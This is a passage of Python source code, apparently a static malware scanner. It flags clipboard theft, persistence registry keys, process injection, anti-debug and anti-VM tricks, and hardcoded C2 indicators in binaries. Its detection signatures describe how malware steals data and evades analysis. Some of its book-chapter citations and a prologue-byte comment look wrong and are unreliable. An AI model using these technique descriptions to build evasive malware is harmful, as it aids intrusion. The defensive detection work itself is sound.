
    simple_checks = [
        (b"OpenClipboard\x00",              "HIGH",   "CLIPBOARD_MONITORING",   "Clipboard data theft — OpenClipboard"),
        (b"GetClipboardData\x00",           "HIGH",   "CLIPBOARD_MONITORING",   "Clipboard data theft — GetClipboardData"),
        (b"SetClipboardViewer\x00",         "MEDIUM", "CLIPBOARD_VIEWER_CHAIN", "Clipboard hook — SetClipboardViewer"),
        (b"GdipCreateBitmapFromHBITMAP\x00","HIGH",   "GDIP_SCREENSHOT",        "GDI+ screenshot exfil — GdipCreateBitmapFromHBITMAP"),
    ]

    for pattern, severity, title, detail in simple_checks:
        if pattern in binary_data:
            findings.append({
                "severity": severity,
                "title":    title,
                "detail":   detail,
                "host":     "localhost",
                "port":     0,
            })

    return findings


def detect_trojan_persistence_patterns(binary_data: bytes) -> list:
    """Detect Windows trojan persistence artifacts in a binary."""
    findings: list = []

    checks = [
        (
            b"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HIGH",
            "REGISTRY_PERSISTENCE",
            "Autorun key write — CurrentVersion\\Run",
        ),
        (
            b"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
            "HIGH",
            "WINLOGON_HIJACK",
            "Userinit/shell replacement via Winlogon key",
        ),
        (b"CreateServiceA\x00",     "HIGH",     "CREATE_SERVICE",              "Service persistence — CreateServiceA"),
        (b"CreateServiceW\x00",     "HIGH",     "CREATE_SERVICE",              "Service persistence — CreateServiceW"),
        (b"schtasks\x00",           "HIGH",     "SCHEDULED_TASK_PERSISTENCE",  "Scheduled task — schtasks"),
        (b"SchRpcRegisterTask\x00", "HIGH",     "SCHEDULED_TASK_PERSISTENCE",  "Scheduled task — SchRpcRegisterTask"),
        (b"AppInit_DLLs\x00",       "CRITICAL", "APPINIT_DLLS",               "Global DLL injection — AppInit_DLLs"),
    ]

    for pattern, severity, title, detail in checks:
        if pattern in binary_data:
            findings.append({
                "severity": severity,
                "title":    title,
                "detail":   detail,
                "host":     "localhost",
                "port":     0,
            })

    return findings


# ---------------------------------------------------------------------------
# 8. Anti-debugging and anti-analysis detection
# ---------------------------------------------------------------------------

def detect_anti_debugging_techniques(binary_data: bytes) -> list:
    """
    Detect anti-debugging and sandbox-evasion artifacts.

    Sources: Practical Malware Analysis ch.84 (dynamic analysis),
    OllyDbg/ProcMon patterns, IsDebuggerPresent, RDTSC timing checks,
    INT3/INT2D traps, OutputDebugStringA+GetLastError (ODSW) pattern.
    """
    findings = []

    # --- Anti-debug API name strings (ASCII in import table / data sections) ---
    for api_name in (
        b"IsDebuggerPresent",
        b"CheckRemoteDebuggerPresent",
        b"NtQueryInformationProcess",
    ):
        if api_name in binary_data:
            findings.append({
                "severity": "HIGH",
                "title":    "ANTI_DEBUG_API_REFERENCED",
                "detail":   f"Anti-debug API present: {api_name.decode()}",
                "host":     "localhost",
                "port":     0,
            })

    # --- RDTSC timing check: 0F 31 repeated within 200-byte window ---
    rdtsc = b"\x0f\x31"
    pos = 0
    while True:
        idx = binary_data.find(rdtsc, pos)
        if idx == -1:
            break
        next_idx = binary_data.find(rdtsc, idx + 2)
        if next_idx != -1 and (next_idx - idx) <= 200:
            findings.append({
                "severity": "HIGH",
                "title":    "RDTSC_TIMING_CHECK",
                "detail":   (
                    f"RDTSC pair at offsets 0x{idx:x}/0x{next_idx:x} "
                    "within 200 bytes — sandbox evasion timing check"
                ),
                "host":     "localhost",
                "port":     0,
            })
            pos = next_idx + 2
        else:
            pos = idx + 2

    # --- Debugger trap instructions ---
    # INT3 (0xCC) run of 3+ consecutive bytes = deliberate trap sled
    int3_pattern = re.compile(b"\xcc{3,}")
    for m in int3_pattern.finditer(binary_data):
        findings.append({
            "severity": "MEDIUM",
            "title":    "DEBUG_TRAP_INSTRUCTIONS",
            "detail":   (
                f"INT3 sled ({len(m.group())} bytes) at offset 0x{m.start():x} "
                "— deliberate debugger trap"
            ),
            "host":     "localhost",
            "port":     0,
        })
        break  # one finding is sufficient

    # INT 0x2D (CD 2D) — Windows kernel debugger breakpoint exception
    int2d = b"\xcd\x2d"
    if int2d in binary_data:
        idx = binary_data.index(int2d)
        findings.append({
            "severity": "MEDIUM",
            "title":    "DEBUG_TRAP_INSTRUCTIONS",
            "detail":   f"INT 0x2D at offset 0x{idx:x} — kernel debugger trap (raises BREAKPOINT exception)",
            "host":     "localhost",
            "port":     0,
        })

    # --- OutputDebugStringA followed by GetLastError within 0x40 bytes (ODSW pattern) ---
    ods  = b"OutputDebugStringA"
    gle  = b"GetLastError"
    pos = 0
    while True:
        ods_idx = binary_data.find(ods, pos)
        if ods_idx == -1:
            break
        gle_idx = binary_data.find(gle, ods_idx, ods_idx + 0x40 + len(ods))
        if gle_idx != -1:
            findings.append({
                "severity": "MEDIUM",
                "title":    "ANTI_DEBUG_ODSW_PATTERN",
                "detail":   (
                    f"OutputDebugStringA+GetLastError at 0x{ods_idx:x} "
                    "— ODSW anti-debug check (last-error diverges under debugger)"
                ),
                "host":     "localhost",
                "port":     0,
            })
            break
        pos = ods_idx + len(ods)

    return findings


# ---------------------------------------------------------------------------
# 9. String obfuscation and encoding pattern detection
# ---------------------------------------------------------------------------

def detect_string_obfuscation(binary_data: bytes) -> list:
    """
    Detect malware string-hiding techniques: XOR encoding, Base64 blobs,
    ROL/ROR cipher sequences, stack-string construction.

    Sources: Practical Malware Analysis ch.147 (simple ciphers),
    XOR key search, ROL/ROR opcode patterns, push-byte stack strings.
    """
    findings = []
    window_size = 4

    # --- XOR single-byte key detection (sliding 4-byte window) ---
    xor_found = False
    for start in range(0, min(len(binary_data) - window_size, 65536), window_size):
        for key in range(1, 0x100):
            # Extend forward to see if we get a printable run > 8 chars
            run_len = 0
            for i in range(start, min(start + 64, len(binary_data))):
                c = binary_data[i] ^ key
                if 0x20 <= c <= 0x7e:
                    run_len += 1
                else:
                    break
            if run_len >= 8:
                findings.append({
                    "severity": "HIGH",
                    "title":    "XOR_ENCODED_STRINGS",
                    "detail":   (
                        f"XOR key 0x{key:02x} produces {run_len}-char printable run "
                        f"at offset 0x{start:x} — C2/payload hidden via XOR encoding"
                    ),
                    "host":     "localhost",
                    "port":     0,
                })
                xor_found = True
                break
        if xor_found:
            break

    # --- Base64-like blobs (>= 3 occurrences of 20+ char b64 strings) ---
    b64_pattern = re.compile(rb"[A-Za-z0-9+/]{20,}={0,2}")
    b64_matches = b64_pattern.findall(binary_data)
    if len(b64_matches) >= 3:
        max_len = max(len(m) for m in b64_matches)
        findings.append({
            "severity": "MEDIUM",
            "title":    "BASE64_BLOB_DETECTED",
            "detail":   (
                f"{len(b64_matches)} Base64-like blobs detected "
                f"(largest: {max_len} bytes) "
                "— encoded payload or C2 data"
            ),
            "host":     "localhost",
            "port":     0,
        })

    # --- ROL/ROR instruction sequences (C0/C1 with /0 or /1 ModRM) ---
    # ROL/ROR r/m8,  imm8 = C0 ModRM imm8  (ModRM & 0x38 in {0x00, 0x08})
    # ROL/ROR r/m32, imm8 = C1 ModRM imm8
    rol_ror_pattern = re.compile(rb"[\xc0\xc1][\x00-\xff][\x00-\xff]")
    rol_ror_hits = rol_ror_pattern.findall(binary_data)
    if len(rol_ror_hits) > 5:
        findings.append({
            "severity": "MEDIUM",
            "title":    "ROL_ROR_CIPHER_PATTERN",
            "detail":   (
                f"{len(rol_ror_hits)} ROL/ROR instruction sequences detected "
                "— rotate-based custom cipher (obfuscated strings/shellcode)"
            ),
            "host":     "localhost",
            "port":     0,
        })

    # --- Stack string construction: repeated single-byte PUSH imm8 (6A xx) sequences ---
    push_imm8 = re.compile(rb"(?:\x6a[\x20-\x7e]){6,}")
    for m in push_imm8.finditer(binary_data):
        findings.append({
            "severity": "MEDIUM",
            "title":    "STACK_STRING_CONSTRUCTION",
            "detail":   (
                f"PUSH-imm8 sequence ({len(m.group())} bytes) at 0x{m.start():x} "
                "— stack string construction pattern (evades static string extraction)"
            ),
            "host":     "localhost",
            "port":     0,
        })
        break  # first hit is sufficient

    return findings


# ---------------------------------------------------------------------------
# 10. Process injection technique detection
# ---------------------------------------------------------------------------

def detect_process_injection_techniques(binary_data: bytes) -> list:
    """
    Detect process injection artifacts: classic remote thread, NtCreateThreadEx,
    hook-based injection, shared-memory injection, APC injection.

    Sources: Practical Malware Analysis ch.84, Windows API injection patterns.
    """
    findings = []

    # --- Classic injection triad: VirtualAllocEx + WriteProcessMemory + CreateRemoteThread ---
    val_ex  = b"VirtualAllocEx"
    wpm     = b"WriteProcessMemory"
    crt     = b"CreateRemoteThread"

    val_idx = binary_data.find(val_ex)
    if val_idx != -1:
        wpm_idx = binary_data.find(wpm, max(0, val_idx - 512), val_idx + 512 + len(val_ex))
        crt_idx = binary_data.find(crt, max(0, val_idx - 512), val_idx + 512 + len(val_ex))
        if wpm_idx != -1 and crt_idx != -1:
            findings.append({
                "severity": "CRITICAL",
                "title":    "CLASSIC_PROCESS_INJECTION",
                "detail":   (
                    f"VirtualAllocEx+WriteProcessMemory+CreateRemoteThread within 512 bytes "
                    f"(at offsets 0x{val_idx:x}/0x{wpm_idx:x}/0x{crt_idx:x}) "
                    "— remote thread injection"
                ),
                "host":     "localhost",
                "port":     0,
            })

    # --- NtCreateThreadEx — undocumented, bypasses AV hooks on CreateRemoteThread ---
    if b"NtCreateThreadEx" in binary_data:
        idx = binary_data.index(b"NtCreateThreadEx")
        findings.append({
            "severity": "CRITICAL",
            "title":    "NTCREATETHREADEX",
            "detail":   (
                f"NtCreateThreadEx at offset 0x{idx:x} "
                "— undocumented NT API, AV-bypass injection technique"
            ),
            "host":     "localhost",
            "port":     0,
        })

    # --- Hook-based injection: SetWindowsHookExW + PostThreadMessage ---
    hook_api = b"SetWindowsHookExW"
    ptm_api  = b"PostThreadMessage"
    hook_idx = binary_data.find(hook_api)
    if hook_idx != -1:
        ptm_idx = binary_data.find(ptm_api)
        if ptm_idx != -1:
            findings.append({
                "severity": "HIGH",
                "title":    "HOOK_BASED_INJECTION",
                "detail":   (
                    f"SetWindowsHookExW+PostThreadMessage at 0x{hook_idx:x}/0x{ptm_idx:x} "
                    "— hook-based code injection (DLL injected via Windows message hook)"
                ),
                "host":     "localhost",
                "port":     0,
            })

    # --- Shared-memory injection: CreateFileMapping + MapViewOfFile + WriteFile ---
    cfm = b"CreateFileMapping"
    mvf = b"MapViewOfFile"
    wf  = b"WriteFile"
    if cfm in binary_data and mvf in binary_data and wf in binary_data:
        cfm_idx = binary_data.index(cfm)
        findings.append({
            "severity": "HIGH",
            "title":    "SHARED_MEMORY_INJECTION",
            "detail":   (
                f"CreateFileMapping+MapViewOfFile+WriteFile at 0x{cfm_idx:x} region "
                "— shared-memory section injection technique"
            ),
            "host":     "localhost",
            "port":     0,
        })

    # --- APC injection: QueueUserAPC ---
    if b"QueueUserAPC" in binary_data:
        idx = binary_data.index(b"QueueUserAPC")
        findings.append({
            "severity": "HIGH",
            "title":    "APC_INJECTION_TECHNIQUE",
            "detail":   f"QueueUserAPC at offset 0x{idx:x} — APC injection (code queued into alertable thread)",
            "host":     "localhost",
            "port":     0,
        })

    return findings


# ---------------------------------------------------------------------------
# 11. x86 function prologue anomaly detection (inline hook indicators)
# ---------------------------------------------------------------------------

def detect_x86_function_prologue_anomalies(binary_data: bytes) -> list:
    """
    Detect unusual x86 function prologue patterns that indicate inline hooks,
    patched functions, or syscall misplacement.

    Standard prologue: 55 89 EC (PUSH EBP; MOV EBP, ESP).
    Hooked function: first 5 bytes replaced with E9 xx xx xx xx (JMP rel32).
    Stub: B8 imm32 C3 (MOV EAX, imm; RET) — hooked return-value forger.
    Syscall anomaly: 0F 34 (SYSENTER) or CD 80 (INT 0x80) in non-entry context.

    Sources: Practical Malware Analysis ch.56 (x86 architecture), function
    prologue/epilogue patterns, inline hook mechanics.
    """
    findings = []

    # --- JMP rel32 (E9) at putative function-start positions ---
    # Heuristic: scan for JMP rel32 not preceded by a standard prologue within 8 bytes.
    jmp_rel32 = re.compile(rb"\xe9[\x00-\xff]{4}")

    jmp_hook_count = 0
    for m in jmp_rel32.finditer(binary_data):
        start = m.start()
        preceding = binary_data[max(0, start - 8):start]
        # Skip if standard prologue (55 89 EC or 55 8B EC) immediately precedes
        if b"\x55\x89\xec" not in preceding and b"\x55\x8b\xec" not in preceding:
            # Skip data-section false positives: context mostly zeros
            context = binary_data[max(0, start - 4):start + 9]
            if context.count(b"\x00") < 8:
                findings.append({
                    "severity": "CRITICAL",
                    "title":    "JMP_HOOK_DETECTED",
                    "detail":   (
                        f"JMP rel32 (E9) at offset 0x{start:x} without preceding standard "
                        "prologue — function entry point redirected (inline hook)"
                    ),
                    "host":     "localhost",
                    "port":     0,
                })
                jmp_hook_count += 1
                if jmp_hook_count >= 3:
                    break

    # --- Function patched: general JMP without prologue (if no CRITICAL already reported) ---
    if not jmp_hook_count:
        patched_pattern = re.compile(rb"(?<!\x55)\xe9[\x00-\xff]{4}")
        for m in patched_pattern.finditer(binary_data):
            ctx = binary_data[max(0, m.start() - 2):m.start() + 7]
            if ctx.count(b"\x00") < 5:
                findings.append({
                    "severity": "HIGH",
                    "title":    "FUNCTION_PATCHED",
                    "detail":   (
                        f"JMP at offset 0x{m.start():x} in place of expected prologue "
                        "— inline hook (function redirected)"
                    ),
                    "host":     "localhost",
                    "port":     0,
                })
                break

    # --- Stub function: MOV EAX, imm32 (B8 xx xx xx xx) + RET (C3) ---
    stub_pattern = re.compile(rb"\xb8[\x00-\xff]{4}\xc3")
    stub_hits = list(stub_pattern.finditer(binary_data))
    if len(stub_hits) > 2:
        first_off = stub_hits[0].start()
        findings.append({
            "severity": "MEDIUM",
            "title":    "STUB_FUNCTION",
            "detail":   (
                f"{len(stub_hits)} MOV EAX,imm32+RET stubs detected "
                f"(first at 0x{first_off:x}) "
                "— hooked return-value forgers (SSDT/IAT stub pattern)"
            ),
            "host":     "localhost",
            "port":     0,
        })

    # --- SYSENTER (0F 34) in unexpected locations ---
    sysenter = b"\x0f\x34"
    pos = 0
    sysenter_count = 0
    while True:
        idx = binary_data.find(sysenter, pos)
        if idx == -1:
            break
        # Flag if not near a MOV EDX,ESP (8B D4 or 89 D4) setup typical of KiFastSystemCall
        near = binary_data[max(0, idx - 8):idx + 4]
        if b"\x8b\xd4" not in near and b"\x89\xd4" not in near:
            findings.append({
                "severity": "HIGH",
                "title":    "SYSCALL_INSTRUCTION_FOUND",
                "detail":   (
                    f"SYSENTER (0F 34) at offset 0x{idx:x} without expected MOV EDX,ESP "
                    "setup — syscall in unexpected location (hook or shellcode)"
                ),
                "host":     "localhost",
                "port":     0,
            })
            sysenter_count += 1
            if sysenter_count >= 2:
                break
        pos = idx + 2

    # --- INT 0x80 (CD 80) — Linux syscall gate in Windows binary = anomaly ---
    int80 = b"\xcd\x80"
    if int80 in binary_data:
        idx = binary_data.index(int80)
        findings.append({
            "severity": "HIGH",
            "title":    "SYSCALL_INSTRUCTION_FOUND",
            "detail":   (
                f"INT 0x80 at offset 0x{idx:x} "
                "— Linux syscall gate in Windows binary (anomalous / shellcode indicator)"
            ),
            "host":     "localhost",
            "port":     0,
        })

    return findings


# ---------------------------------------------------------------------------
# 7. Top-level file orchestrator
# ---------------------------------------------------------------------------

def scan_kernel_file(filepath: str) -> List[Dict]:
    """
    Orchestrate all Windows kernel RE detection passes against a single file.

    Reads the file as raw bytes, runs all detection functions, and returns
    a combined findings list with consistent host/port keys.
    """
    findings: List[Dict] = []

    # Baseline info finding
    findings.append({
        "severity": "INFO",
        "title": "FILE_SCANNED",
        "detail": f"Windows kernel artifact scan: {filepath}",
        "host": "localhost",
        "port": 0,
    })

    try:
        with open(filepath, "rb") as fh:
            binary_data = fh.read()
    except OSError as exc:
        findings.append({
            "severity": "HIGH",
            "title": "FILE_READ_ERROR",
            "detail": f"Cannot read {filepath}: {exc}",
            "host": "localhost",
            "port": 0,
        })
        return findings

    # Run all detection passes
    for detect_fn in (
        scan_ioctl_codes,
        detect_dkom_artifacts,
        detect_ssdt_hook,
        detect_irql_elevation,
        detect_driver_signing_bypass,
    ):
        sub = detect_fn(binary_data)
        # Ensure every sub-finding has host/port (scan_ioctl_codes already sets them)
        for f in sub:
            f.setdefault("host", "localhost")
            f.setdefault("port", 0)
        findings.extend(sub)

    return findings


# ---------------------------------------------------------------------------
# 12. Anti-virtual-machine technique detection
#     Sources: Practical Malware Analysis (No Starch), ch.17 — "Anti-Virtual Machine
#     Techniques", sections: VMware Artifacts, Vulnerable Instructions (Red Pill /
#     No Pill), I/O Communication Port (Phatbot/Storm backdoor IN instruction).
# ---------------------------------------------------------------------------

def detect_anti_vm_techniques(binary_data: bytes) -> list:
    """
    Detect anti-virtual-machine evasion artifacts in a binary.

    Checks:
      - VMware CPUID leaf 0x40000000: MOV EAX,0x40000000 + CPUID (0F A2)
        within a 64-byte window — hypervisor-leaf detection.
      - VMware I/O backdoor IN instruction (0xED / IN EAX,DX) near the
        VMXh magic value (0x564D5868 little-endian) — Phatbot/Storm pattern.
      - VirtualBox artifact strings: VBoxGuestAdditions, VBoxService, VBoxMouse.
      - SIDT instruction (0F 01 /5 — ModRM reg=101): Red Pill IDTR relocation
        check used to detect single-processor VMware guests.
      - Sleep(100) timing evasion: PUSH 0x64 (6A 64 or 68 64 00 00 00) near
        GetTickCount string — checks wall-clock delta after sleep to detect
        accelerated sandbox execution.

    Returns list of {severity, title, detail, host="localhost", port=0}.
    """
    findings: list = []

    # --- VMware CPUID leaf 0x40000000 detection ---
    # MOV EAX, 0x40000000 (B8 00 00 00 40) followed by CPUID (0F A2) within 64 bytes.
    # Malware queries hypervisor presence leaf; VMware echoes "VMwareVMware" in EBX/ECX/EDX.
    cpuid_opcode = b"\x0f\xa2"
    mov_eax_leaf = b"\xb8\x00\x00\x00\x40"

    cpuid_positions = [m.start() for m in re.finditer(re.escape(cpuid_opcode), binary_data)]
    for cp in cpuid_positions:
        window_start = max(0, cp - 64)
        window = binary_data[window_start:cp]
        if mov_eax_leaf in window:
            findings.append({
                "severity": "HIGH",
                "title":    "VMWARE_CPUID_DETECTION",
                "detail":   (
                    f"CPUID (0F A2) at offset 0x{cp:x} preceded by MOV EAX,0x40000000 "
                    "within 64 bytes — hypervisor leaf detection (VMware/VirtualBox "
                    "signature: EBX='VMwa',ECX='reVM',EDX='ware')"
                ),
                "host": "localhost",
                "port": 0,
            })
            break

    # --- VMware I/O backdoor IN instruction (0xED) with VMXh magic ---
    # Phatbot: loads EAX=0x564D5868 ('VMXh'), ECX=0xA (get version), DX=0x5658 ('VX'),
    # then executes IN EAX,DX (0xED). VMM echoes VMXh back in EBX if running under VMware.
    in_eax_dx = b"\xed"
    vmxh_le   = b"\x68\x58\x4d\x56"   # 0x564D5868 as little-endian push immediate
    vmxh_str  = b"VMXh"

    in_positions = [m.start() for m in re.finditer(re.escape(in_eax_dx), binary_data)]
    for ip in in_positions:
        window = binary_data[max(0, ip - 32):min(len(binary_data), ip + 32)]
        if vmxh_le in window or vmxh_str in window:
            findings.append({
                "severity": "HIGH",
                "title":    "VMWARE_BACKDOOR_IO",
                "detail":   (
                    f"IN EAX,DX (0xED) at offset 0x{ip:x} near VMXh magic value "
                    "(0x564D5868) — VMware I/O communication port backdoor "
                    "(port 0x5658 'VX'; used by Phatbot/Storm worm)"
                ),
                "host": "localhost",
                "port": 0,
            })
            break

    # --- VirtualBox artifact string checks ---
    # Malware searches process listing, registry, or filesystem for VBox artifacts
    # to confirm VirtualBox guest context before activating payload.
    vbox_artifacts = [
        (b"VBoxGuestAdditions", "VBoxGuestAdditions registry/path string"),
        (b"VBoxService",        "VBoxService.exe process name"),
        (b"VBoxMouse",          "VBoxMouse driver registry string"),
    ]
    vbox_hits = []
    for sig, desc in vbox_artifacts:
        if sig in binary_data:
            idx = binary_data.index(sig)
            vbox_hits.append(f"{desc} at 0x{idx:x}")

    if vbox_hits:
        findings.append({
            "severity": "HIGH",
            "title":    "VIRTUALBOX_ARTIFACT_CHECK",
            "detail":   (
                "VirtualBox artifact string(s) present: "
                + "; ".join(vbox_hits)
                + " — malware enumerates VBox Guest Additions to detect virtual environment"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- SIDT Red Pill: 0F 01 with ModRM reg=5 (bits[5:3]=101) ---
    # Red Pill executes SIDT to read the IDTR; VMware cannot trap this in user-mode
    # and the guest IDTR base differs from the host's, exposing virtualization.
    # ModRM bytes with reg=5 (101b): mod=00 -> 0x28-0x2F, mod=01 -> 0x68-0x6F,
    #                                mod=10 -> 0xA8-0xAF, mod=11 -> 0xE8-0xEF
    sidt_pattern = re.compile(
        rb"\x0f\x01[\x28-\x2f\x68-\x6f\xa8-\xaf\xe8-\xef]"
    )
    for m in sidt_pattern.finditer(binary_data):
        findings.append({
            "severity": "MEDIUM",
            "title":    "SIDT_VM_DETECTION",
            "detail":   (
                f"SIDT instruction (0F 01 /5) at offset 0x{m.start():x} "
                "— Red Pill technique: reads IDTR register; VMware guest IDTR "
                "base differs from host (0xFF signature byte at offset +5)"
            ),
            "host": "localhost",
            "port": 0,
        })
        break  # one hit is sufficient for the finding

    # --- Sleep timing evasion: Sleep(100) near GetTickCount ---
    # Malware calls Sleep(0x64=100ms), then GetTickCount to measure elapsed time.
    # In an accelerated sandbox the delta will be far less than 100ms, exposing
    # the analysis environment. PUSH 0x64 is either 6A 64 (PUSH imm8) or
    # 68 64 00 00 00 (PUSH imm32).
    gtc_str    = b"GetTickCount"
    sleep_imm8 = b"\x6a\x64"              # PUSH 100 (byte form)
    sleep_dw   = b"\x68\x64\x00\x00\x00"  # PUSH 100 (dword form)

    gtc_positions = [m.start() for m in re.finditer(re.escape(gtc_str), binary_data)]
    for gp in gtc_positions:
        window = binary_data[max(0, gp - 128):min(len(binary_data), gp + 128)]
        if sleep_imm8 in window or sleep_dw in window:
            findings.append({
                "severity": "HIGH",
                "title":    "SLEEP_TIMING_EVASION",
                "detail":   (
                    f"PUSH 0x64 (Sleep 100ms) within 128 bytes of GetTickCount "
                    f"at offset 0x{gp:x} — sandbox timing evasion: measures wall-clock "
                    "delta after sleep to detect accelerated sandbox execution"
                ),
                "host": "localhost",
                "port": 0,
            })
            break

    return findings


# ---------------------------------------------------------------------------
# 13. Network indicator extraction from binary data
#     Sources: Practical Malware Analysis (No Starch), ch.14 — "Malware-Focused
#     Network Signatures": hardcoded IPs/domains, User-Agent RAT patterns,
#     content-based IDS countermeasures; ch.156 combining dynamic/static analysis.
# ---------------------------------------------------------------------------

def detect_network_indicators_in_binary(binary_data: bytes) -> list:
    """
    Extract hardcoded network indicators embedded in a binary.

    Checks:
      - IPv4 addresses in printable strings (excludes loopback/broadcast/unspecified).
      - Domain names with high-risk TLDs: .com .net .org .xyz .ru .cn .top .cc
      - HTTP/HTTPS URLs — CRITICAL C2 indicator when hardcoded.
      - RAT User-Agent strings: "Mozilla/4.0 (compatible; MSIE" (first-gen RAT
        mimicry) and "libwww" (wget/libwww-perl C2 beacon pattern).

    Each finding: {severity, title, detail, host="localhost", port=0}.
    """
    findings: list = []

    # Extract contiguous printable ASCII runs >= 6 chars for string-based checks.
    printable_pattern = re.compile(rb"[\x20-\x7e]{6,}")
    printable_strings = b"\n".join(m.group() for m in printable_pattern.finditer(binary_data))

    # --- Hardcoded IPv4 addresses ---
    # Excludes: 0.0.0.0, 127.x.x.x (loopback), 255.255.255.255 (broadcast).
    ip_pattern = re.compile(
        rb"\b(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})\b"
    )
    seen_ips: set = set()
    for m in ip_pattern.finditer(printable_strings):
        octets = tuple(int(g) for g in m.groups())
        if not all(0 <= o <= 255 for o in octets):
            continue
        # Skip loopback, unspecified, broadcast
        if octets[0] == 127 or octets == (0, 0, 0, 0) or octets == (255, 255, 255, 255):
            continue
        ip_str = ".".join(str(o) for o in octets)
        if ip_str in seen_ips:
            continue
        seen_ips.add(ip_str)
        findings.append({
            "severity": "HIGH",
            "title":    "HARDCODED_IP_ADDRESS",
            "detail":   (
                f"Hardcoded IPv4 address '{ip_str}' in binary strings — "
                "potential C2 server, pivot host, or exfil endpoint"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- Hardcoded domain names (high-risk TLDs) ---
    # Scans printable strings for FQDNs. URL pattern runs first so domains
    # embedded in URLs do not produce duplicate findings.
    domain_pattern = re.compile(
        rb"(?<![a-zA-Z0-9-])([a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?"
        rb"\.(com|net|org|xyz|ru|cn|top|cc))\b",
        re.IGNORECASE,
    )
    seen_domains: set = set()
    for m in domain_pattern.finditer(printable_strings):
        domain = m.group(1).decode(errors="replace").lower()
        if domain in seen_domains:
            continue
        seen_domains.add(domain)
        findings.append({
            "severity": "HIGH",
            "title":    "HARDCODED_DOMAIN",
            "detail":   (
                f"Hardcoded domain '{domain}' in binary strings — "
                "C2 domain, DGA seed, or update server"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- Hardcoded HTTP/HTTPS URLs (CRITICAL: direct C2 indicator) ---
    url_pattern = re.compile(
        rb"https?://[a-zA-Z0-9\-._~:/?#\[\]@!$&'()*+,;=%]{4,}",
        re.IGNORECASE,
    )
    seen_urls: set = set()
    for m in url_pattern.finditer(binary_data):
        url = m.group(0).decode(errors="replace")
        if url in seen_urls:
            continue
        seen_urls.add(url)
        # Mark domain from this URL as seen to suppress duplicate HARDCODED_DOMAIN
        for dm in domain_pattern.finditer(m.group(0)):
            seen_domains.add(dm.group(1).decode(errors="replace").lower())
        findings.append({
            "severity": "CRITICAL",
            "title":    "HARDCODED_URL",
            "detail":   (
                f"Hardcoded URL '{url[:120]}' embedded in binary — "
                "C2 indicator: direct beacon, payload download, or exfil endpoint"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- RAT User-Agent patterns ---
    # "Mozilla/4.0 (compatible; MSIE" — first-generation RAT HTTP mimicry.
    # Malware hardcodes this string to blend with IE6/IE7 traffic; static UA
    # is detectable because real browsers update dynamically.
    # "libwww" — libwww-perl / wget default UA found in older C2 beacons.
    rat_ua_checks = [
        (
            b"Mozilla/4.0 (compatible; MSIE",
            "Mozilla/4.0 (compatible; MSIE ...) — first-gen RAT HTTP mimicry; "
            "hardcoded static User-Agent characteristic of early C2 beacons "
            "(Practical Malware Analysis ch.14: 'first generation mimicked browser')",
        ),
        (
            b"libwww",
            "libwww User-Agent string — wget/libwww-perl beacon pattern; "
            "used by downloader-type malware for C2 check-in",
        ),
    ]
    for sig, desc in rat_ua_checks:
        if sig in binary_data:
            idx = binary_data.index(sig)
            # Extract full UA string (up to 200 bytes or first non-printable)
            ua_end = idx
            while ua_end < min(len(binary_data), idx + 200):
                if binary_data[ua_end] < 0x20 or binary_data[ua_end] > 0x7e:
                    break
                ua_end += 1
            ua_sample = binary_data[idx:ua_end].decode(errors="replace")
            findings.append({
                "severity": "HIGH",
                "title":    "RAT_USER_AGENT",
                "detail":   f"RAT User-Agent '{ua_sample[:80]}': {desc}",
                "host": "localhost",
                "port": 0,
            })

    return findings


def detect_windows_registry_persistence(binary_data: bytes) -> list:
    """Scan for Windows registry persistence key strings embedded in a binary.

    Grounded in Practical Malware Analysis ch.7 (The Windows Registry) and ch.11
    (Persistence Mechanisms): malware writes to Run keys, Services keys, Winlogon
    Notify, AppInit_DLLs, and Shell Folders to survive reboots.  The presence of
    these key-path strings -- especially paired with RegSetValueEx -- is a strong
    static indicator of persistence intent.

    Args:
        binary_data: Raw bytes of the binary under analysis.

    Returns:
        List of finding dicts with keys: severity, title, detail, host, port.
    """
    findings: list = []

    # Each entry: (needle_bytes, severity, title, detail_suffix)
    # Both ASCII and wide (UTF-16LE) variants are checked for each needle.
    persistence_sigs = [
        (
            b"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "CRITICAL",
            "AUTORUN_REGISTRY_KEY",
            (
                "Run key path found in binary -- classic autostart persistence; "
                "malware writes its path here so the OS launches it on every logon "
                "(PMA ch.7: 'a well-known way to set up software to run automatically')"
            ),
        ),
        (
            b"SYSTEM\\CurrentControlSet\\Services",
            "HIGH",
            "SERVICE_REGISTRY_KEY",
            (
                "Services registry path found -- driver/service persistence; "
                "malware installs itself as a Windows service or kernel driver "
                "that loads at boot before user logon "
                "(PMA ch.11: 'all services persist in the registry')"
            ),
        ),
        (
            b"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
            "CRITICAL",
            "WINLOGON_PERSISTENCE",
            (
                "Winlogon registry path found -- logon hook persistence; "
                "malware hooks Winlogon events (logon, logoff, startup, shutdown, "
                "lock screen) to survive even safe-mode boots "
                "(PMA ch.11: 'can even allow the malware to load in safe mode')"
            ),
        ),
        (
            b"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",
            "HIGH",
            "SHELL_FOLDERS_PERSISTENCE",
            (
                "Shell Folders registry path found -- startup folder redirection "
                "or persistence via Explorer shell integration; "
                "used to redirect startup folder locations to attacker-controlled paths"
            ),
        ),
        (
            b"RegSetValueEx",
            "HIGH",
            "REGISTRY_WRITE_API",
            (
                "RegSetValueEx API string found -- dynamic registry write capability; "
                "combined with any persistence key path this confirms active registry "
                "modification at runtime "
                "(PMA ch.7: 'adds a new value to the registry and sets its data')"
            ),
        ),
    ]

    for needle, severity, title, detail in persistence_sigs:
        # Check ASCII embedding
        ascii_hit = needle in binary_data
        # Check UTF-16LE embedding (Windows native wide-char path strings)
        wide_needle = b"\x00".join(bytes([b]) for b in needle) + b"\x00"
        wide_hit = wide_needle in binary_data

        if ascii_hit or wide_hit:
            enc = "ASCII+Wide" if (ascii_hit and wide_hit) else ("Wide" if wide_hit else "ASCII")
            findings.append({
                "severity": severity,
                "title":    title,
